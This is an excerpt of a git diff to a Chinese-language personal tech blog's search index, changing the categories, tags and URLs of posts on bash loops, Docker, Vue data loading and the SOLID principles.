+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> variable <span class="keyword">in</span> <span class="variable">$&#123;arr[@]&#125;</span>; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 <p>或：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (( expr1; expr2; expr3 )); <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 <p>比如：</p>
@@ -8432,7 +8514,8 @@
 <p>类似于加载外部库。</p>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>Shell</tag>
@@ -8440,7 +8523,7 @@
   </entry>
   <entry>
     <title>docker入门</title>
-    <url>/application/docker%E5%85%A5%E9%97%A8.html</url>
+    <url>/docker%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>趁着实习摸鱼（啊不是）之际，简单学习一下曾经很想入门的 docker 。</p>
 <p>在上一篇有关 DevOps 的博客中，曾提到：docker 容器的出现，推动了 DevOps 的发展。而 docker 的功劳不仅如此，它的出现可以说是：具有划时代的意义。</p>
 <p>很早之前，我就想学习 docker 。但，那时 docker 还未完全支持 Windows 平台，奈何电脑又太差，不敢给 Linux 虚拟机分配太高配置，导致 docker 学习一直被搁置。</p>
@@ -8537,16 +8620,17 @@
 </ul>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>欲穷千里目，更上一层楼</category>
+        <category>云</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>Docker</tag>
+        <tag>grpc</tag>
       </tags>
   </entry>
   <entry>
     <title>vue先加载数据再渲染</title>
-    <url>/application/vue%E5%85%88%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E5%86%8D%E6%B8%B2%E6%9F%93.html</url>
+    <url>/vue%E5%85%88%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E5%86%8D%E6%B8%B2%E6%9F%93.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vue 使用中 bug 记录。</p>
 <p>版本：<code>vue 3.0</code></p>
 <p>由于 JavaScript 中请求通常是异步，因此几乎无法实现先加载数据再渲染页面。</p>
@@ -8567,11 +8651,25 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p v-if&#x3D;&quot;paper.venue&quot;&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;router-link v-if&#x3D;&quot;paper.venue&quot; :to&#x3D;&quot;&#123; path: &#39;&#x2F;&#39; &#125;&quot;&gt;&#123;&#123; paper.venue.name &#125;&#125;&lt;&#x2F;router-link&gt;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
-        <tag>Javascript</tag>
+        <tag>前端</tag>
+        <tag>Vue</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>软件设计之SOLID原则</title>
+    <url>/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%B9%8BSOLID%E5%8E%9F%E5%88%99.html</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>九层之台，起于累土</category>
+        <category>软件工程</category>
+      </categories>
+      <tags>
+        <tag>软件工程</tag>
+        <tag>软件设计</tag>
       </tags>
   </entry>
 </search>
